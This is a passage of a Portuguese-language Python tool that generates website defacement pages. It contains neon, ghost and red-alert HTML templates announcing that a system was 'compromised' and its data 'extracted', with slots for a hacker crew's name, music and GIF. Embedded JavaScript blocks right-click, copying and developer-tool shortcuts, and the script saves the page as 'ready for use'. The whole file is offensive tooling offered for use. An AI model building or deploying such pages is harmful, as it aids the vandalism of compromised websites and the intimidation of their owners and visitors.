            if (e.ctrlKey && [85,83,80].includes(e.keyCode)) { e.preventDefault(); showBlockOverlay('BLOQUEADO'); return; }
        });
        ['copy','paste','cut','selectstart','dragstart'].forEach(ev => {
            document.addEventListener(ev, e => { e.preventDefault(); if (!['selectstart','dragstart'].includes(ev)) showBlockOverlay('BLOQUEADO'); });
        });
    </script>
</body>
</html>'''
    },
    3: {
        'nome': 'Cyber Elite',
        'icon': '🚀',
        'desc': 'Estilo futurista neon',
        'html': '''<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🚀 {{TITULO}} - {{NOME_TROPA}}</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; cursor: default; }
        body {
            background: #000;
            color: #fff;
            font-family: 'Courier New', monospace;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: linear-gradient(135deg, #000022, #000011);
            position: relative;
            overflow: hidden;
        }
        .bg-gif { position: fixed; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; opacity: 0.1; z-index: 0; }
        .container {
            max-width: 900px;
            width: 100%;
            background: rgba(0,20,40,0.85);
            border: 2px solid #00ffff;
            box-shadow: 0 0 60px rgba(0,255,255,0.3);
            padding: 40px;
            text-align: center;
            border-radius: 16px;
            backdrop-filter: blur(10px);
            position: relative;
            z-index: 1;
        }
        .neon-title {
            font-size: 2.8rem;
            color: #00ffff;
            text-shadow: 0 0 30px rgba(0,255,255,0.5), 0 0 60px rgba(0,255,255,0.2);
            letter-spacing: 8px;
            font-weight: 900;
        }
        .neon-sub { color: #0088ff; font-size: 1rem; letter-spacing: 4px; margin: 10px 0; }
        .hacker-name {
            color: #00ff88;
            font-size: 1.2rem;
            margin: 20px 0;
            border: 1px solid rgba(0,255,255,0.2);
            padding: 10px 30px;
            display: inline-block;
            border-radius: 30px;
            background: rgba(0,255,255,0.05);
        }
        .data-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 15px; margin: 30px 0; }
        .data-item { background: rgba(0,20,40,0.5); border: 1px solid rgba(0,255,255,0.1); padding: 15px; border-radius: 8px; }
        .data-item .num { color: #00ffff; font-size: 1.5rem; font-weight: 900; }
        .data-item .label { color: #0088ff; font-size: 0.7rem; text-transform: uppercase; }
        .info { color: #004466; font-size: 0.8rem; margin-top: 20px; border-top: 1px solid rgba(0,255,255,0.1); padding-top: 20px; }
        .info span { color: #00ffff; }
        .block-overlay {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.95); z-index: 9999; justify-content: center; align-items: center;
            flex-direction: column;
        }
        .block-overlay.show { display: flex; }
        .block-overlay .big-icon { font-size: 5rem; color: #00ffff; animation: pulse 1s infinite; }
        @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.3; } }
        .block-overlay .msg { color: #fff; font-size: 1.5rem; margin-top: 20px; font-weight: bold; }
    </style>
</head>
<body>
    {{GIF_FUNDO}}

    <div class="block-overlay" id="blockOverlay">
        <div class="big-icon">⛔</div>
        <div class="msg">ACESSO BLOQUEADO</div>
    </div>

    {{MUSICA}}

    <div class="container">
        <div style="font-size:3rem;">🚀</div>
        <div class="neon-title">{{NOME_TROPA}}</div>
        <div class="neon-sub">⚡ {{TITULO}} ⚡</div>
        <div class="hacker-name">👤 {{NOME_HACKER}}</div>
        <p style="color:#88ccff;font-size:0.9rem;margin:20px 0;">Sistema comprometido. Dados extraídos com sucesso.</p>
        <div class="data-grid">
            <div class="data-item"><div class="num">100%</div><div class="label">Comprometido</div></div>
            <div class="data-item"><div class="num">∞</div><div class="label">Acesso</div></div>
            <div class="data-item"><div class="num">0</div><div class="label">Defesas</div></div>
        </div>
        <div class="info"><span>🚀</span> {{DATA}} <span>🚀</span></div>
    </div>

    <script>
        let overlayTimeout;
        function showBlockOverlay(msg) {
            const overlay = document.getElementById('blockOverlay');
            overlay.querySelector('.msg').innerText = '⛔ ' + msg;
            overlay.classList.add('show');
            clearTimeout(overlayTimeout);
            overlayTimeout = setTimeout(() => overlay.classList.remove('show'), 2000);
        }
        document.addEventListener('contextmenu', e => { e.preventDefault(); showBlockOverlay('BLOQUEADO'); });
        document.addEventListener('keydown', e => {
            if ([123,122,121,120].includes(e.keyCode)) { e.preventDefault(); showBlockOverlay('BLOQUEADO'); return; }
            if (e.ctrlKey && e.shiftKey && [73,74,67].includes(e.keyCode)) { e.preventDefault(); showBlockOverlay('BLOQUEADO'); return; }
            if (e.ctrlKey && [85,83,80].includes(e.keyCode)) { e.preventDefault(); showBlockOverlay('BLOQUEADO'); return; }
        });
        ['copy','paste','cut','selectstart','dragstart'].forEach(ev => {
            document.addEventListener(ev, e => { e.preventDefault(); if (!['selectstart','dragstart'].includes(ev)) showBlockOverlay('BLOQUEADO'); });
        });
    </script>
</body>
</html>'''
    },
    4: {
        'nome': 'Ghost Squad',
        'icon': '👻',
        'desc': 'Minimalista e misterioso',
        'html': '''<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>👻 {{TITULO}} - {{NOME_TROPA}}</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; cursor: default; }
        body {
            background: #050505;
            color: #fff;
            font-family: 'Courier New', monospace;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
            overflow: hidden;
        }
        .bg-gif { position: fixed; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; opacity: 0.08; z-index: 0; }
        .container {
            max-width: 800px;
            width: 100%;
            background: rgba(10,10,10,0.9);
            border: 1px solid #222;
            padding: 50px 40px;
            text-align: center;
            box-shadow: 0 0 100px rgba(255,255,255,0.02);
            position: relative;
            z-index: 1;
        }
        .ghost { font-size: 5rem; color: #444; animation: float 3s infinite; }
        @keyframes float { 0%,100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
        h1 { color: #666; font-size: 2.2rem; letter-spacing: 10px; font-weight: 100; }
        .sub { color: #333; font-size: 0.9rem; letter-spacing: 5px; margin: 10px 0; }
        .hacker { color: #444; font-size: 1rem; margin: 20px 0; border-top: 1px solid #111; border-bottom: 1px solid #111; padding: 15px 0; }
        .info { color: #222; font-size: 0.7rem; margin-top: 30px; }
        .info span { color: #444; }
        .block-overlay {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.95); z-index: 9999; justify-content: center; align-items: center;
            flex-direction: column;
        }
        .block-overlay.show { display: flex; }
        .block-overlay .big-icon { font-size: 5rem; color: #666; }
        .block-overlay .msg { color: #fff; font-size: 1.5rem; margin-top: 20px; font-weight: bold; }
    </style>
</head>
<body>
    {{GIF_FUNDO}}

    <div class="block-overlay" id="blockOverlay">
        <div class="big-icon">⛔</div>
        <div class="msg">ACESSO BLOQUEADO</div>
    </div>

    {{MUSICA}}

    <div class="container">
        <div class="ghost">👻</div>
        <h1>{{NOME_TROPA}}</h1>
        <div class="sub">{{TITULO}}</div>
        <div class="hacker">➜ {{NOME_HACKER}}</div>
        <p style="color:#333;font-size:0.9rem;margin:20px 0;line-height:1.8;">
            O sistema foi comprometido.<br>
            Todos os dados foram extraídos.<br>
            Não há defesa.
        </p>
        <div class="info"><span>👻</span> {{DATA}} <span>👻</span></div>
    </div>

    <script>
        let overlayTimeout;
        function showBlockOverlay(msg) {
            const overlay = document.getElementById('blockOverlay');
            overlay.querySelector('.msg').innerText = '⛔ ' + msg;
            overlay.classList.add('show');
            clearTimeout(overlayTimeout);
            overlayTimeout = setTimeout(() => overlay.classList.remove('show'), 2000);
        }
        document.addEventListener('contextmenu', e => { e.preventDefault(); showBlockOverlay('BLOQUEADO'); });
        document.addEventListener('keydown', e => {
            if ([123,122,121,120].includes(e.keyCode)) { e.preventDefault(); showBlockOverlay('BLOQUEADO'); return; }
            if (e.ctrlKey && e.shiftKey && [73,74,67].includes(e.keyCode)) { e.preventDefault(); showBlockOverlay('BLOQUEADO'); return; }
            if (e.ctrlKey && [85,83,80].includes(e.keyCode)) { e.preventDefault(); showBlockOverlay('BLOQUEADO'); return; }
        });
        ['copy','paste','cut','selectstart','dragstart'].forEach(ev => {
            document.addEventListener(ev, e => { e.preventDefault(); if (!['selectstart','dragstart'].includes(ev)) showBlockOverlay('BLOQUEADO'); });
        });
    </script>
</body>
</html>'''
    },
    5: {
        'nome': 'Red Alert',
        'icon': '🔴',
        'desc': 'Alerta vermelho intenso',
        'html': '''<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔴 {{TITULO}} - {{NOME_TROPA}}</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; cursor: default; }
        body {
            background: #0a0000;
            color: #fff;
            font-family: 'Courier New', monospace;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: radial-gradient(ellipse at center, #1a0000, #0a0000);
            position: relative;
            overflow: hidden;
        }
        .bg-gif { position: fixed; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; opacity: 0.12; z-index: 0; }
        .container {
            max-width: 900px;
            width: 100%;
            background: rgba(10,0,0,0.9);
            border: 3px solid #ff0000;
            box-shadow: 0 0 80px rgba(255,0,0,0.5);
            padding: 40px;
            text-align: center;
            animation: borderPulse 2s infinite;
            position: relative;
            z-index: 1;
        }
        @keyframes borderPulse { 0%,100% { border-color: #ff0000; } 50% { border-color: #660000; } }
        .alert { font-size: 4rem; color: #ff0000; animation: alertPulse 0.5s infinite; }
        @keyframes alertPulse { 0%,100% { opacity: 1; } 50% { opacity: 0.2; } }
        h1 { color: #ff0000; font-size: 2.5rem; text-transform: uppercase; letter-spacing: 10px; text-shadow: 0 0 60px rgba(255,0,0,0.3); }
        .sub { color: #ff4444; font-size: 1rem; letter-spacing: 4px; margin: 10px 0; }
        .hacker { color: #ff6666; font-size: 1.1rem; margin: 20px 0; }
        .info { color: #662222; font-size: 0.8rem; margin-top: 30px; border-top: 1px solid #1a0000; padding-top: 20px; }
        .info span { color: #ff0000; }
        .block-overlay {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.95); z-index: 9999; justify-content: center; align-items: center;
            flex-direction: column;
        }
        .block-overlay.show { display: flex; }
        .block-overlay .big-icon { font-size: 5rem; color: #ff0000; animation: alertPulse 0.5s infinite; }
        .block-overlay .msg { color: #fff; font-size: 1.5rem; margin-top: 20px; font-weight: bold; }
    </style>
</head>
<body>
    {{GIF_FUNDO}}

    <div class="block-overlay" id="blockOverlay">
        <div class="big-icon">⛔</div>
        <div class="msg">ACESSO BLOQUEADO</div>
    </div>

    {{MUSICA}}

    <div class="container">
        <div class="alert">🔴</div>
        <h1>{{NOME_TROPA}}</h1>
        <div class="sub">⚠️ {{TITULO}} ⚠️</div>
        <div class="hacker">👤 {{NOME_HACKER}}</div>
        <div style="border:1px solid #1a0000;padding:20px;margin:20px 0;color:#ff4444;font-size:0.9rem;">
            [ALERTA VERMELHO]<br>
            SISTEMA COMPROMETIDO<br>
            AÇÃO IMEDIATA REQUERIDA
        </div>
        <div class="info"><span>🔴</span> {{DATA}} <span>🔴</span></div>
    </div>

    <script>
        let overlayTimeout;
        function showBlockOverlay(msg) {
            const overlay = document.getElementById('blockOverlay');
            overlay.querySelector('.msg').innerText = '⛔ ' + msg;
            overlay.classList.add('show');
            clearTimeout(overlayTimeout);
            overlayTimeout = setTimeout(() => overlay.classList.remove('show'), 2000);
        }
        document.addEventListener('contextmenu', e => { e.preventDefault(); showBlockOverlay('BLOQUEADO'); });
        document.addEventListener('keydown', e => {
            if ([123,122,121,120].includes(e.keyCode)) { e.preventDefault(); showBlockOverlay('BLOQUEADO'); return; }
            if (e.ctrlKey && e.shiftKey && [73,74,67].includes(e.keyCode)) { e.preventDefault(); showBlockOverlay('BLOQUEADO'); return; }
            if (e.ctrlKey && [85,83,80].includes(e.keyCode)) { e.preventDefault(); showBlockOverlay('BLOQUEADO'); return; }
        });
        ['copy','paste','cut','selectstart','dragstart'].forEach(ev => {
            document.addEventListener(ev, e => { e.preventDefault(); if (!['selectstart','dragstart'].includes(ev)) showBlockOverlay('BLOQUEADO'); });
        });
    </script>
</body>
</html>'''
    }
}


def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')


def print_header():
    clear_screen()
    print(BANNER)
    print(f"\n{BOLD}{YELLOW}[+] Gerando Deface Page...{RESET}\n")


def get_musica():
    """Menu de seleção de música"""
    print(f"\n{BOLD}{CYAN}🎵 SELECIONE A MÚSICA DE FUNDO{RESET}\n")
    
    for key, musica in MUSICAS.items():
        if key == 5:
            print(f"  {BOLD}{WHITE}{key}.{RESET} {musica['nome']} (Enter seco = sem música)")
        else:
            print(f"  {BOLD}{WHITE}{key}.{RESET} 🎵 {CYAN}{musica['nome']}{RESET}")
    
    print()
    while True:
        try:
            escolha = input(f"{BOLD}{WHITE}Escolha uma música (1-5) ou Enter para sem música: {RESET}").strip()
            
            # Enter seco = sem música
            if escolha == '':
                return None, 'Nenhuma'
            
            escolha = int(escolha)
            if 1 <= escolha <= 5:
                break
            print(f"{RED}❌ Escolha um número entre 1 e 5{RESET}")
        except ValueError:
            print(f"{RED}❌ Digite um número válido ou Enter para pular{RESET}")
    
    if escolha == 5:
        musica_url = input(f"{BOLD}{WHITE}🔗 Digite a URL da música (Enter seco = sem música): {RESET}").strip()
        if not musica_url:
            return None, 'Nenhuma'
        musica_nome = 'URL Personalizada'
    else:
        musica_url = MUSICAS[escolha]['url']
        musica_nome = MUSICAS[escolha]['nome']
    
    return musica_url, musica_nome


def get_gif():
    """Menu de GIF de fundo"""
    print(f"\n{BOLD}{CYAN}🖼️  GIF DE FUNDO (OPCIONAL){RESET}\n")
    print(f"{WHITE}💡 Hospede seu GIF em:{RESET}")
    print(f"   • {CYAN}https://catbox.moe{RESET} (grátis, sem registro)")
    print(f"   • {CYAN}https://imgur.com{RESET}")
    print(f"   • {CYAN}https://giphy.com{RESET}\n")
    
    gif_url = input(f"{BOLD}{WHITE}🔗 URL do GIF (Enter seco = sem GIF): {RESET}").strip()
    
    if not gif_url:
        return None
    
    return gif_url


def get_user_input():
    """Coleta as informações do usuário"""
    print(f"{BOLD}{CYAN}📝 INFORMAÇÕES DO DEFACE{RESET}\n")
    
    nome_tropa = input(f"{BOLD}{WHITE}🏴 Nome da Tropa/Grupo: {RESET}").strip()
    if not nome_tropa:
        nome_tropa = "Tropa do Xoinho"
    
    nome_hacker = input(f"{BOLD}{WHITE}👤 Nome do Hacker: {RESET}").strip()
    if not nome_hacker:
        nome_hacker = "Xoinho"
    
    titulo = input(f"{BOLD}{WHITE}📌 Título do Deface: {RESET}").strip()
    if not titulo:
        titulo = "SISTEMA BLOQUEADO"
    
    musica_url, musica_nome = get_musica()
    gif_url = get_gif()
    
    print(f"\n{BOLD}{CYAN}🎨 ESTILOS DISPONÍVEIS{RESET}\n")
    print(f"  {BOLD}{WHITE}1.{RESET} 🎯 {CYAN}Tropa do Xoinho{RESET} - Estilo hacker clássico (ORIGINAL FODA)")
    for key, template in TEMPLATES.items():
        print(f"  {BOLD}{WHITE}{key}.{RESET} {template['icon']} {CYAN}{template['nome']}{RESET} - {template['desc']}")
    
    print()
    while True:
        try:
            estilo = int(input(f"{BOLD}{WHITE}Escolha um estilo (1-5): {RESET}"))
            if 1 <= estilo <= 5:
                break
            print(f"{RED}❌ Escolha um número entre 1 e 5{RESET}")
        except ValueError:
            print(f"{RED}❌ Digite um número válido{RESET}")
    
    return {
        'nome_tropa': nome_tropa,
        'nome_hacker': nome_hacker,
        'titulo': titulo,
        'musica_url': musica_url,
        'musica_nome': musica_nome,
        'gif_url': gif_url,
        'estilo': estilo,
        'data': datetime.now().strftime('%d/%m/%Y %H:%M')
    }


def generate_deface(data):
    """Gera a página de deface com os dados do usuário"""
    if data['estilo'] == 1:
        template_html = TEMPLATE_TROPA_XOINHO
    else:
        template_html = TEMPLATES[data['estilo']]['html']
    
    html = template_html.replace('{{NOME_TROPA}}', data['nome_tropa'])
    html = html.replace('{{NOME_HACKER}}', data['nome_hacker'])
    html = html.replace('{{TITULO}}', data['titulo'])
    html = html.replace('{{DATA}}', data['data'])
    
    # GIF DE FUNDO
    if data['gif_url']:
        gif_html = f'<img class="bg-gif" src="{data["gif_url"]}" alt="">'
    else:
        gif_html = ''
    html = html.replace('{{GIF_FUNDO}}', gif_html)
    
    # MÚSICA
    if data['musica_url']:
        musica_html = f'''
        <!-- Música de fundo: {data['musica_nome']} -->
        <audio id="bg-music" autoplay loop>
            <source src="{data['musica_url']}" type="audio/mpeg">
            <source src="{data['musica_url']}" type="audio/ogg">
            <source src="{data['musica_url']}" type="audio/wav">
        </audio>
        <script>
            const audio = document.getElementById('bg-music');
            if (audio) {{
                audio.volume = 0.6;
                audio.loop = true;
                audio.play().catch(e => console.log('Áudio bloqueado pelo navegador'));
            }}
        </script>
        '''
    else:
        musica_html = ''
    html = html.replace('{{MUSICA}}', musica_html)
    
    return html


def save_deface(html, data):
    """Salva a página gerada"""
    output_dir = 'output'
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)
    
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    filename = f"deface_{timestamp}.html"
    filepath = os.path.join(output_dir, filename)
    
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write(html)
    
    return filepath


def show_completion(filepath, data):
    """Mostra mensagem de conclusão"""
    if data['estilo'] == 1:
        estilo_nome = 'Tropa do Xoinho (ORIGINAL)'
    else:
        estilo_nome = TEMPLATES[data['estilo']]['nome']
    
    print(f"\n{BOLD}{GREEN}✅ DEFACE GERADO COM SUCESSO!{RESET}\n")
    print(f"{BOLD}{WHITE}📁 Arquivo:{RESET} {filepath}")
    print(f"{BOLD}{WHITE}🎨 Estilo:{RESET} {estilo_nome}")
    print(f"{BOLD}{WHITE}🏴 Tropa:{RESET} {data['nome_tropa']}")
    print(f"{BOLD}{WHITE}👤 Hacker:{RESET} {data['nome_hacker']}")
    print(f"{BOLD}{WHITE}🎵 Música:{RESET} {data['musica_nome']}")
    print(f"{BOLD}{WHITE}🖼️  GIF:{RESET} {data['gif_url'] if data['gif_url'] else 'Nenhum'}")
    
    print(f"\n{BOLD}{YELLOW}💡 Para testar localmente:{RESET}")
    print(f"   {WHITE}python3 -m http.server 8080{RESET}")
    print(f"   {WHITE}Acesse: http://localhost:8080/output/{os.path.basename(filepath)}{RESET}")
    
    print(f"\n{BOLD}{GREEN}🔥 Deface TOP pronto para uso!{RESET}\n")


def main():
    print_header()
    
    data = get_user_input()
    
    print(f"\n{BOLD}{YELLOW}⏳ Gerando página...{RESET}")
    time.sleep(1)
    
    html = generate_deface(data)
    filepath = save_deface(html, data)
    
    show_completion(filepath, data)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{RED}❌ Operação cancelada pelo usuário{RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{RED}❌ Erro: {e}{RESET}")
        sys.exit(1)
